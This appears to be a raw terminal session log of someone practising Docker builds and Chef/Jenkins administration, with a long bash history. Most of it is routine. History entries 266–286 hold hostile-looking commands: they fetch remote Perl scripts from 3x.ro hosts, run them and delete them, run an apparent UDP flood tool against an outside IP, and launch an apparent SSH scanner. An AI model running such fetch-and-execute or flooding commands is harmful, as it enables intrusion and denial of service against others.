+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# vim Dockerfile 
+[?1049h[?1h=[?2004h[2;1H▽[6n[2;1H  [1;1H]11;?[1;33r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[33;1H"Dockerfile" 5L, 78C[>c[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mENV [mJAVA_HOME /usr/bin/java
+[1m[34m~                                                                                          [7;1H~                                                                                          [8;1H~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll[5;1H[?12l[?25h[27m[m[H[2J[?25l[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6
+[33mMAINTAINER [mshahan
+[33mENV [mJAVA_HOME /usr/bin/java
+[1m[34m~                                                                                          [7;1H~                                                                                          [8;1H~                                                                                          [9;1H~                                                                                          [10;1H~                                                                                          [11;1H~                                                                                          [12;1H~                                                                                          [13;1H~                                                                                          [14;1H~                                                                                          [15;1H~                                                                                          [16;1H~                                                                                          [17;1H~                                                                                          [18;1H~                                                                                          [19;1H~                                                                                          [20;1H~                                                                                          [21;1H~                                                                                          [22;1H~                                                                                          [23;1H~                                                                                          [24;1H~                                                                                          [25;1H~                                                                                          [26;1H~                                                                                          [27;1H~                                                                                          [28;1H~                                                                                          [29;1H~                                                                                          [30;1H~                                                                                          [31;1H~                                                                                          [32;1H~                                                                                          [m[33;74H5,1[11CAll"Dockerfile" 5L, 78C[5;1H[?12l[?25h[?25l[1m[34m~                                                                                          [m[33;74H4[4;1H[?12l[?25h[?25l[3;1H[1m[34m~                                                                                          [4;1H~                                                                                          [m[33;74H2,0-1[2;1H[?12l[?25h[?25l[33;1H[1m-- INSERT --[m[33;14H[K[33;74H2,1[11CAll[2;1H[?12l[?25h[33;1H[K[2;1H[?25l[33;74H2,0-1[9CAll[2;1H[?12l[?25h[?25l[33;1H2 more lines; before #2  2 seconds ago[33;74H[K[3;1H[33mFROM [mcentos:centos6[3;20H[K[4;1H[33mMAINTAINER [mshahan[4;18H[K[33;74H3,1[11CAll[3;1H[?12l[?25h[?25l[33;1H[1m-- INSERT --[m[33;13H[K[33;74H3,20[10CAll[3;20H[?12l[?25h[?25l[33;74H4,18[4;18H[?12l[?25h[?25l[5;1H[K[33;74H5,1 [5;1H[?12l[?25h[?25lC[33;76H2[5;2H[?12l[?25h[?25lM[33;76H3[5;3H[?12l[?25h[?25lD[33;76H4[5;4H[?12l[?25h[?25l[33mCMD [m[33;76H5[5;5H[?12l[?25h[?25le[33;76H6[5;6H[?12l[?25h[?25lc[33;76H7[5;7H[?12l[?25h[?25lh[33;76H8[5;8H[?12l[?25h[?25l[33mecho[m[33;76H9[5;9H[?12l[?25h[?25l[31m [m[33;76H10[5;10H[?12l[?25h[?25l[33m"[m[33;77H1[5;11H[?12l[?25h[?25l[31mh[m[33;77H2[5;12H[?12l[?25h[?25l[31me[m[33;77H3[5;13H[?12l[?25h[?25l[31ml[m[33;77H4[5;14H[?12l[?25h[?25l[31ml[m[33;77H5[5;15H[?12l[?25h[?25l[31mo[m[33;77H6[5;16H[?12l[?25h[?25l[31m [m[33;77H7[5;17H[?12l[?25h[?25l[31mh[m[33;77H8[5;18H[?12l[?25h[?25l[31mo[m[33;77H9[5;19H[?12l[?25h[?25l[31mw[m[33;76H20[5;20H[?12l[?25h[?25l[31m [m[33;77H1[5;21H[?12l[?25h[?25l[31ma[m[33;77H2[5;22H[?12l[?25h[?25l[31mr[m[33;77H3[5;23H[?12l[?25h[?25l[31me[m[33;77H4[5;24H[?12l[?25h[?25l[31m [m[33;77H5[5;25H[?12l[?25h[?25l[31my[m[33;77H6[5;26H[?12l[?25h[?25l[31mo[m[33;77H7[5;27H[?12l[?25h[?25l[31mu[m[33;77H8[5;28H[?12l[?25h[?25l[33m"[m[33;77H9[5;29H[?12l[?25h[33;1H[K[5;28H[?25l[33;74H5,28[10CAll[5;28H[?12l[?25h[?25l[33;74H[K[33;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h1[?25l[?12l[?25h[?25l"1" [New] 5L, 79C written
+[1m[37m[41mE37: No write since last change[m
+[1m[37m[41mE162: No write since last change for buffer "Dockerfile"[m
+[32mPress ENTER or type command to continue[?12l[?25h[m[1;1H[3L[?25l[1;1H[34m# My image[m
+
+[33mFROM [mcentos:centos6[33;1H[K[33;74H5,28[10CAll[5;28H[?12l[?25h[?25l[33;1HAlready at newest change[33;74H[K[33;74H5,28[10CAll[5;28H[?12l[?25h[?25l[33;1H[K[33;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l"Dockerfile" 5L, 79C written
+[?2004l[?1l>[?12l[?25h[?1049l]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Cb': docker run -it env:v2 /bin/bash[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pu': docker build -t "env:v2" .[3P[root@docker Build]#[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1@1[1P[1P[1P[1@c[1@m[1@d
+Sending build context to Docker daemon 3.072 kB
+Step 1/3 : FROM centos:centos6
+ ---> 5dedbd63518e
+Step 2/3 : MAINTAINER shahan
+ ---> Using cache
+ ---> 5afae0aa08e2
+Step 3/3 : CMD echo "hello how are you"
+ ---> Running in 91c3ab8d5ff5
+ ---> 0c49c9804ab3
+Removing intermediate container 91c3ab8d5ff5
+Successfully built 0c49c9804ab3
+]0;root@docker:/tmp/Build[root@docker Build]# docker run -it cmd:va[K1 /bin/bash
+]0;@82cfc12aab71:/[?1034h[root@82cfc12aab71 /]# exit
+]0;root@docker:/tmp/Build[root@docker Build]# docker run -it cmd:v1 /bin/bash[1P[1P[1P[1P[1P[1@ 
+]0;root@docker:/tmp/Build[root@docker Build]# docker run cmd:v1 /bin/bash[1@-[1@d[1@ 
+e7606501d95cea318f9350a89207425256ad17a999716a2992c76da78770ef65
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# docekr p[Kdocker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+da34b62f6722        env:v2              "/bin/bash"         4 minutes ago       Up 4 minutes                            suspicious_ardinghelli
+ec9a0f95b482        user:v1             "/bin/bash"         28 minutes ago      Up 28 minutes                           unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         44 minutes ago      Up 44 minutes                           myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         56 minutes ago      Up 56 minutes                           myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         59 minutes ago      Up 59 minutes                           myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"         24 hours ago        Up About an hour                        gifted_wescoff
+]0;root@docker:/tmp/Build[root@docker Build]# docke rps -a
+-bash: docke: command not found
+]0;root@docker:/tmp/Build[root@docker Build]# docker ps -a
+CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS                       PORTS               NAMES
+e7606501d95c        cmd:v1              "/bin/bash"              43 seconds ago       Exited (0) 41 seconds ago                        peaceful_lumiere
+a8a34b5d381b        cmd:v1              "/bin/bash"              49 seconds ago       Exited (0) 48 seconds ago                        serene_lichterman
+82cfc12aab71        cmd:v1              "/bin/bash"              About a minute ago   Exited (0) 57 seconds ago                        objective_archimedes
+da34b62f6722        env:v2              "/bin/bash"              4 minutes ago        Up 4 minutes                                     suspicious_ardinghelli
+5638dd64284d        env:v1              "/bin/bash"              7 minutes ago        Exited (127) 5 minutes ago                       mystifying_ardinghelli
+dec501eb92d7        03f86e0fe8b7        "/bin/sh -c 'yum i..."   24 minutes ago       Exited (1) 24 minutes ago                        kickass_murdock
+ec9a0f95b482        user:v1             "/bin/bash"              29 minutes ago       Up 29 minutes                                    unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"              44 minutes ago       Up 44 minutes                                    myimage_test2
+aa257cc33922        5afae0aa08e2        "/bin/sh -c 'yum u..."   45 minutes ago       Exited (1) 45 minutes ago                        jolly_borg
+c71ae0a635c9        5afae0aa08e2        "/bin/sh -c 'yum u..."   47 minutes ago       Exited (1) 47 minutes ago                        agitated_curie
+87ac319e7836        myimage:v1          "/bin/bash"              56 minutes ago       Up 56 minutes                                    myimage_test
+7c653431c05d        centos:centos6      "/bin/bash"              58 minutes ago       Exited (1) 58 minutes ago                        test
+c63f9a1e9732        centos:centos6      "/bin/bash"              About an hour ago    Up 59 minutes                                    myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 server3
+c35d80212462        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"              About an hour ago    Up About an hour                                 server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"              24 hours ago         Up About an hour                                 gifted_wescoff
+]0;root@docker:/tmp/Build[root@docker Build]# docker attach peaceful_lumiere
+You cannot attach to a stopped container, start it first
+]0;root@docker:/tmp/Build[root@docker Build]# docker attach peaceful_lumiere[6P peaceful_lumieres peaceful_lumieret peaceful_lumierea peaceful_lumierer peaceful_lumieret peaceful_lumiere
+peaceful_lumiere
+]0;root@docker:/tmp/Build[root@docker Build]# docker start peaceful_lumiere[1@attach[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+You cannot attach to a stopped container, start it first
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [K[root@docker Build]# cat [Kcat Dockerfile 
+# My image
+
+FROM centos:centos6
+MAINTAINER shahan
+CMD echo "hello how are you"
+]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Ch': docker attach peaceful_lumiere[16Pi': which service[5Ps': history[1@t[C[C[C[1@o[C[C[C[1@r[C[C[C[1@y[C[C[C[8P[root@docker Build]#[C
+    1  vim /etc/hosts
+    2  vim /etc/ssh/sshd_config 
+    3  service sshd reload
+    4  ssh localhost
+    5  passwd root
+    6  ssh localhost
+    7  useradd chef
+    8  passwd chef
+    9  visudo
+   10  usermod -g chef wheel
+   11  usermod -g wheel chef
+   12  ssh chef@localhost
+   13  visudo
+   14  su - chef
+   15  visudo
+   16  id -a chef
+   17  su - chef
+   18  hostname workstation
+   19  vim /etc/sysconfig/network
+   20  hostname
+   21  ssh server
+   22  mv ~ec2-user/chef-repo ~chef/
+   23  su - chef
+   24  ssh node1
+   25  cat /etc/hosts
+   26  ssh node1
+   27  ssh server
+   28  ping node1
+   29  su - chef
+   30  su - ece2-user
+   31  su - ec2-user
+   32  ssh node1
+   33  su - chef
+   34  yum install postgresql-server
+   35  postgres -h
+   36  postgres initdb
+   37  postgresql-setup initdb
+   38  find / -iname postgresql-setup
+   39  yum install postgresql8-server-8.4.20-5.52.amzn1.x86_64
+   40  find / -iname postgres*
+   41  /etc/rc.d/init.d/postgresql status
+   42  /etc/rc.d/init.d/postgresql start
+   43  service postgresql initdb
+   44  psql
+   45  vim /home/chef/chef-repo/cookbooks/postgresql/recipes/default.rb 
+   46  cd /home/chef/chef-repo/
+   47  cd cookbooks/
+   48  chef-client -zr "recipe[postgresql]"
+   49  vim postgresql/recipes/default.rb 
+   50  chef-client -zr "recipe[postgresql]"
+   51  ps -ef|grep -i postgres
+   52  su - chef
+   53  history
+   54  chef-client -zr "recipe[postgresql]"
+   55  history
+   56  service postgresql initdb
+   57  yum remove postgresql-server
+   58  cd /home/chef/chef-repo/cookbooks/
+   59  chef-client -zr "recipe[postgresql]"
+   60  cat postgresql/recipes/default.rb 
+   61  rm -rf /var/lib/pgsql
+   62  chef-client -zr "recipe[postgresql]"
+   63  cat postgresql/recipes/default.rb 
+   64  service postgresql status
+   65  service postgresql stop
+   66  service postgresql start
+   67  vim postgresql/recipes/default.rb 
+   68  chef-client -zr "recipe[postgresql]"
+   69  service postgresql restart
+   70  vim postgresql/recipes/default.rb 
+   71  chef-client -zr "recipe[postgresql]"
+   72  vim postgresql/recipes/default.rb 
+   73  chef-client -zr "recipe[postgresql]"
+   74  knife cookbook upload postgresql
+   75  su - chef
+   76  cd /home/chef/
+   77  ls -al
+   78  cd chef-repo/
+   79  ll
+   80  su - chef
+   81  cat /etc/hosts
+   82  cd /home/chef/
+   83  ls -al
+   84  ll
+   85  cd chef-repo/
+   86  ll
+   87  knife node lsit
+   88  knife node list
+   89  knife node show node1
+   90  knife node show node1 -r
+   91  knife node show node2 -r
+   92  knife client list
+   93  knife -h
+   94  knife search node node1 -Fj|less
+   95  knife search node node1 -a "chef_packages".version
+   96  knife search node node1 -a chef_packages
+   97  knife search node node1 -a chef_packages.chef.version
+   98  ll
+   99  cd cookbooks/
+  100  ls -al
+  101  cd apache/
+  102  ls -al
+  103  vim recipes/default.rb 
+  104  ls -l recipes/default.rb 
+  105  ls -l recipes/
+  106  cd recipes/
+  107  vim website.rb 
+  108  knife cookbook upload apache
+  109  knife search node 'role:web'
+  110  vim website.rb 
+  111  knife node show node1 -r
+  112  knife role show web
+  113  knife role edit web
+  114  export EDITOR=$(which vim)
+  115  knife role edit web
+  116  knife role upload
+  117  knife upload role web
+  118  knife role list
+  119  knife role show web
+  120  vim website.rb 
+  121  knife upload cookbook apache
+  122  vim website.rb 
+  123  knife upload cookbook apache
+  124  vim website.rb 
+  125  knife upload cookbook apache
+  126  cat website.rb 
+  127  chef-client -zr "recipe[apache]"
+  128  chef-client -zr "recipe[apache:website]"
+  129  chef-client -zr "recipe[apache::website]"
+  130  cat website.rb 
+  131  chef-client -zr website.rb 
+  132  chef-client -z website.rb 
+  133  cat /home/chef/chef-repo/.chef/local-mode-cache/cache/cookbooks/apache/recipes/website.rb
+  134  knife upload cookbook apache
+  135  vim website.rb 
+  136  knife uplaod cookbook apache
+  137  knife upload cookbook apache
+  138  cat website.rb 
+  139  ssh node1
+  140  vim /etc/hosts
+  141  ssh node3
+  142  for i in node1 node2 node3; do scp /etc/hosts $i:/etc/hosts; done
+  143  cd /home/chef/chef-repo/
+  144  ls -al
+  145  knife node lsit
+  146  knife node list
+  147  knife bootstrap ip-172-31-0-250.eu-west-2.compute.internal -N "node3" -x chef -P chef --sudo
+  148  knife node list
+  149  knife node show node3 -r
+  150  knife node run_list -h
+  151  knife nnode run_list add node3 "role[web]"
+  152  knife nnode run_list add node3 role[web]
+  153  knife node run_list -h
+  154  knife node run_list set node3 "role[web]"
+  155  knife node show node3
+  156  knife cookbook list
+  157  cd cookbooks/
+  158  ls -l
+  159  cd apache/
+  160  ls  -al
+  161  cat metadata.rb 
+  162  cd recipes/
+  163  ls -al
+  164  cat website.rb 
+  165  vim website.rb 
+  166  ll
+  167  cd ..
+  168  vim metadata.rb 
+  169  knife upload cookbook apache
+  170  knife cookbook list
+  171  knife upload -h
+  172  knife cookbook upload apache
+  173  knife cookbook list
+  174  vim recipes/website.rb 
+  175  vim metadata.rb 
+  176  knife cookbook upload apache
+  177  knife cookbook download apache
+  178  history
+  179  cat metadata.rb 
+  180  cat recipes/website.rb 
+  181  knife node show node1 -l|less
+  182  knife node show node1 -Fja chef_packages
+  183  knife node show node1 -Fj -a chef_packages
+  184  knife node show node1 -Fj |less
+  185  knife node show node1 -Fj |more
+  186  knife node show node1 -Fj
+  187  knife node show node1 -Fjl
+  188  knife node show node1 -l
+  189  knife node show node1 -l|more
+  190  knife node show node1 -F -a cloud
+  191  knife node show node1 -Fa cloud
+  192  knife node show node1 -a cloud
+  193  knife node show node1 -F
+  194  knife node show node1 -Fj
+  195  knife node show node1 -h
+  196  knife node show node1 -Fj
+  197  knife node show node1 -Fjl
+  198  knife node show node1 -l -Fj
+  199  knife node show node1 -l -Fj -a cloud
+  200  knife node show node1 -l -Fj -a cloud."private_ips"
+  201  knife node show node1 -l -Fj|grep -i repo
+  202  knife node show node1 -l -Fj|grep -i tags
+  203  ssh node1 "chef-client"
+  204  ssh node1
+  205  cd /home/chef/
+  206  ls -al
+  207  tar -cvf chef.tar chef-repo
+  208  ll
+  209  find / -iname backup
+  210  find / -iname *.rb
+  211  find / -iname apache
+  212  ll
+  213  pwd
+  214  cp chef-repo /tmp/
+  215  cp chef-repo /tmp/ -r
+  216  cd /tp
+  217  cd /tmp/
+  218  chmod -R 777 chef-repo/
+  219  cd /home/chef/
+  220  ls -al
+  221  knife role lsit
+  222  knife role list
+  223  cd chef
+  224  cd chef-repo/
+  225  ls -al
+  226  knife node list
+  227  knife role list
+  228  knife role edit web
+  229  export EDITOR=$(which vim)
+  230  knife role edit web
+  231  knife role list
+  232  knife role delete web
+  233  knife role lsit
+  234  knife role list
+  235  knife role delete postgresql
+  236  knife role list
+  237  knife node list
+  238  knife cookbook list
+  239  knife coobook delete apache
+  240  knife cookbook -h\
+  241  knife cookbook -h
+  242  knife cookbook delete apache
+  243  knife cookbook list
+  244  knife cookbook delete postgresql
+  245  knife cookbook list
+  246  knife node list
+  247  knife node -h
+  248  knife node delete node*
+  249  knife node delete node1
+  250  knife node list
+  251  knife node delete -h
+  252  knife node delete node2 -h
+  253  knife node delete node2 -y
+  254  knife node delete node3 -y
+  255  cat /etc/host
+  256  cat /etc/hosts
+  257  ping node2
+  258  ping node1
+  259  ping node2
+  260  ls
+  261  passwd
+  262  ls
+  263  clear
+  264  ls
+  265  cd /var/tmp
+  266  wget ciufulici.3x.ro/test.py
+  267  clear
+  268  perl test.py
+  269  wget fakeyt.3x.ro/birja.php && perl birja.php && rm -rf birja.php
+  270  perl birja.php
+  271  wget fakeyt.3x.ro/birja.php && perl birja.php && rm -rf birja.php
+  272  wget fakeyt.3x.ro/private/udpu
+  273  clear
+  274  perl udpu 69.39.239.239 0 0
+  275  ls
+  276  rm -rf udpu test.py
+  277  w
+  278  clear
+  279  ls
+  280  cd /var/tm,p
+  281  cd /var/tmp
+  282  wget fakeyt.3x.ro/f.tar &&tar  xvf f.tar
+  283  cd f
+  284  ls
+  285  clear
+  286  ./a 217.182 22
+  287  ssh-keygen 
+  288  cat ~/.ssh/id_rsa.pub 
+  289  cat ~/.ssh/id_rsa.pub
+  290  git clone git@github.com:shan5a6/jenkinstest.git
+  291  ls -ld jenkinstest/
+  292  git status
+  293  cd jenkinstest/
+  294  git status
+  295  ls -al
+  296  cd
+  297  pwd
+  298  git clone https://github.com/shan5a6/keepalived.git
+  299  ll
+  300  ls -al
+  301  find / -iname chef-repo
+  302  mv keepalived /home/chef/chef-repo/cookbooks/
+  303  cd /home/chef/chef-repo/cookbooks/
+  304  ll
+  305  cd keepalived/
+  306  ls a-l
+  307  ls -al
+  308  rm README.md 
+  309  ll
+  310  chef-client -zr "recipe::keepalived"
+  311  chef-client -zr "recipe::db-keepalived"
+  312  ll
+  313  cd db-keepalived
+  314  ll
+  315  cd ..
+  316  ls -al
+  317  ll
+  318  cd ..
+  319  ll
+  320  rm -rf keepalived/
+  321  ll
+  322  git clone https://github.com/shan5a6/keepalived.git
+  323  ll
+  324  cd keepalived/
+  325  ll
+  326  git branch
+  327  ping google.com
+  328  init 0
+  329  vim /etc/sysconfig/network
+  330  hostname slave
+  331  bash
+  332  vim /etc/ssh/sshd_config 
+  333  service sshd reload
+  334  ifconfig eth0
+  335  passwd root
+  336  ls -l jdk-8u144-linux-x64.rpm 
+  337  mkdir jenkins
+  338  mv jdk-8u144-linux-x64.rpm jenkins
+  339  cd jenkins
+  340  ls -al
+  341  rpm -Uvh jdk-8u144-linux-x64.rpm 
+  342  alternatives --install /usr/bin/java java /usr/java/lastest/bin/java 20000
+  343  alternatives --install /usr/bin/javac javac /usr/java/lastest/bin/javac 20000
+  344  alternatives --install /usr/bin/jar jar /usr/java/lastest/bin/jar 20000
+  345  vim /etc/rc.local
+  346  source /etc/rc.local
+  347  useradd jenkins -d /var/lib/jenkins
+  348  mkdir -p /var/lib/jenkins/.ssh
+  349  su - jenkins
+  350  rm /var/lib/jenkins/.ssh
+  351  rm /var/lib/jenkins/.ssh -rf
+  352  su - jenkins
+  353  cd /tmp/
+  354  git clone git@github.com:shan5a6/d2bjenkins.git
+  355  ll
+  356  ls -al
+  357  cd d2bjenkins
+  358  ls -al
+  359  ls -l .git
+  360  git status
+  361  git branch
+  362  yum install git -y
+  363  ls -l
+  364  touch test
+  365  git add test
+  366  git commit -m "testing the build"
+  367  git config --global user.email "shan5a6"
+  368  git config --global user.name "shahan.aix@gmail.com"
+  369  git status
+  370  git commit -m "testing the build"
+  371  git push origin master
+  372  vim /var/www/html/index.html
+  373  serivce httpd restart
+  374  service httpd restart
+  375  curl localhost
+  376  cd /tmp/
+  377  ls
+  378  ls -al
+  379  cd d2bjenkins/
+  380  ls -al
+  381  git remote -v
+  382  ls
+  383  cd ..
+  384  ls
+  385  ls -lrt
+  386  cd d2bjenkins/
+  387  ls -l
+  388  cat test 
+  389  git status
+  390  git branch
+  391  git log
+  392  git status
+  393  touch test`
+  394  touch test1
+  395  git add test1
+  396  git commit -m "adding test1"
+  397  git push origin master
+  398  git log
+  399  service jenkins status
+  400  docker ps 
+  401  docker attach gifted_wescoff
+  402  echo $0
+  403  yum install docker
+  404  yum install docker -y
+  405  cd /etc/yum.repos.d/
+  406  ls a-l
+  407  ll
+  408  cat amzn-main.repo
+  409  cd
+  410  service docker status
+  411  service docker strt
+  412  service docker start
+  413  service docker status
+  414  chkconfig docker on
+  415  chkconfig --list docker
+  416  ping google.com
+  417  docker iimages
+  418  docker iamges
+  419  docker images
+  420  docker pull ubuntu:xenial
+  421  docker images
+  422  hisotry
+  423  history
+  424  docker run -it ubuntu:xenail /bin/bash
+  425  docker run -it ubuntu:xenial /bin/bash
+  426  docker top gifted_wescoff
+  427  docker stats gifted_wescoff
+  428  echo $0
+  429  cat /etc/shells 
+  430  sh
+  431  init 0
+  432  uptime
+  433  df 0hT
+  434  df -hT
+  435  vim /etc/sysconfig/network
+  436  hostname docker
+  437  bash
+  438  df -hT
+  439  cd /var/lib/docker/
+  440  ls -al
+  441  docker ps 
+  442  docker ps -a
+  443  docker statrt gifted_wescoff
+  444  docker start gifted_wescoff
+  445  docker ps
+  446  pwd
+  447  ll
+  448  cd containers
+  449  ll
+  450  docker images
+  451  ll
+  452  cd ..
+  453  ll
+  454  cd image/
+  455  ls -al
+  456  cd vo
+  457  cd overlay2/
+  458  ll
+  459  cd iim
+  460  cd imagedb/
+  461  ll
+  462  cd metadata/
+  463  ll
+  464  cd sha256/
+  465  ll
+  466  cd ..
+  467  cd con
+  468  pwd
+  469  ll
+  470  cd ..
+  471  ll
+  472  cd content/
+  473  ll
+  474  cd sha256/
+  475  ll
+  476  docker images
+  477  pwd
+  478  cd /var/lib/docker/
+  479  ll
+  480  docker iamges
+  481  docker images
+  482  docker run -it --name server1 ubuntu:xenial /bin/bash
+  483  docker ps
+  484  docker run -it --name server2 ubuntu:xenial /bin/bash
+  485  docker ps
+  486  docker ps -a
+  487  docker start server2
+  488  docker ps
+  489  docker attach server2
+  490  docker attach server1
+  491  docker run -it --name server3 ubuntu:xenial /bin/bash
+  492  docker run -it -d --name server4 ubuntu:xenial /bin/bash
+  493  for i in {1..5}; do docker run -it -d --name test$i ubuntu:xenial /
+  494  for i in {1..5}; do docker run -it -d --name test$i ubuntu:xenial /bin/bash; done
+  495  docker ps
+  496  docker ps|grep -i test
+  497  df -hT
+  498  docker attach test1
+  499  docker into|more
+  500  docker info|more
+  501  free -m
+  502  cat /proc/cpuinfo |more
+  503  docker inspect test1|more
+  504  docker images
+  505  docker pull centos:centos6 
+  506  docker images
+  507  docker run -it --name myimage centos:centos6 /bin/bash
+  508  docker run -it --name test centos:centos6 /bin/bash
+  509  docker ps
+  510  docker images
+  511  docker commit myimage myimage:v1
+  512  docker images
+  513  docker run -it --name myimage_test myimage:v1 /bin/bash
+  514  docker images
+  515  mkdir Build
+  516  vim Dockerfile
+  517  docker build -t "myimage:v2" .
+  518  docker build -t "testimage:v1" .
+  519  pwd
+  520  cd Build/
+  521  ls -al
+  522  cd ..
+  523  ls -ld Build/
+  524  mv Build/ /tmp/
+  525  cd t/mp
+  526  cd /tmp/
+  527  cd Build/
+  528  ls -al
+  529  cat Do
+  530  vim Docekrfile
+  531  cat DO
+  532  cat Docekrfile 
+  533  docker build -t "testimage:v1" .
+  534  mv Docekrfile Dockerfile
+  535  docker build -t "testimage:v1" .
+  536  cat DO
+  537  cat Dockerfile 
+  538  vim Dockerfile 
+  539  docker build -t "testimage:v1" .
+  540  vim Dockerfile 
+  541  docker build -t "testimage:v1" .
+  542  docker images
+  543  docker run -it --name myimage_test2 testimage:v1 /bin/bash
+  544  docker ps |grep -i test
+  545  docker attach test2
+  546  docker exec test2 useradd test
+  547  docker attach test2
+  548  while true; do echo Helloo; done
+  549  docker run -d --name run_test centos:centos6 bash -c 'while true;do echo Hello;sleep 2;done"
+  550  docker run -d --name run_test centos:centos6 bash -c 'while true;do echo Hello;sleep 2;done'
+  551  docker ps|grep -i run
+  552  docker logs run_test
+  553  docker logs run_test|wc -l
+  554  docker attach run_test
+  555  df -hT
+  556  vim Dockerfile 
+  557  docker build -t "User:v1" .
+  558  docker build -t "user:v1" .
+  559  docker images
+  560  docker run -it user:v1 /bin/bash
+  561  docker ps
+  562  docker attach unruffled_bhabha
+  563  docker exec -it -u 0 unruffled_bhabha /bin/bash
+  564  vim Dockerfile 
+  565  cat Dockerfile 
+  566  docker build -t "user:v2" .
+  567  cat Dockerfile 
+  568  vim Dockerfile 
+  569  cat Dockerfile 
+  570  which service
+  571  echo $PATH
+  572  env|more
+  573  sudo su -
+  574  docker rm -f run_test
+  575  df -hT
+  576  val=20
+  577  echo $val
+  578  cat /etc/shells 
+  579  sh
+  580  echo $val
+  581  export val=20
+  582  echo $val
+  583  sh
+  584  vim ~/.bashrc
+  585  cd /tmp/Build/
+  586  ls -l
+  587  vim Dockerfile 
+  588  docker build -t "env:v1" .
+  589  docker run -it env:v1 /bin/bash
+  590  vim Dockerfile 
+  591  docke rps
+  592  docker ps
+  593  docker ps -a
+  594  docker start 5638dd64284d
+  595  docker attach 5638dd64284d
+  596  vim Dockerfile 
+  597  docker build -t "env:v2" .
+  598  docker run -it env:v2 /bin/bash
+  599  vim Dockerfile 
+  600  docker build -t "cmd:v1" .
+  601  docker run -it cmd:v1 /bin/bash
+  602  docker run cmd:v1 /bin/bash
+  603  docker run -d cmd:v1 /bin/bash
+  604  docker ps
+  605  docke rps -a
+  606  docker ps -a
+  607  docker attach peaceful_lumiere
+  608  docker start peaceful_lumiere
+  609  docker attach peaceful_lumiere
+  610  cat Dockerfile 
+  611  history
+]0;root@docker:/tmp/Build[root@docker Build]# docekr ps [Kdocker ps -a|more
+CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                         PORTS               NAMES
+e7606501d95c        cmd:v1              "/bin/bash"              8 minutes ago       Exited (0) 7 minutes ago                           peacefu
+l_lumiere
+a8a34b5d381b        cmd:v1              "/bin/bash"              9 minutes ago       Exited (0) 9 minutes ago                           serene_
+lichterman
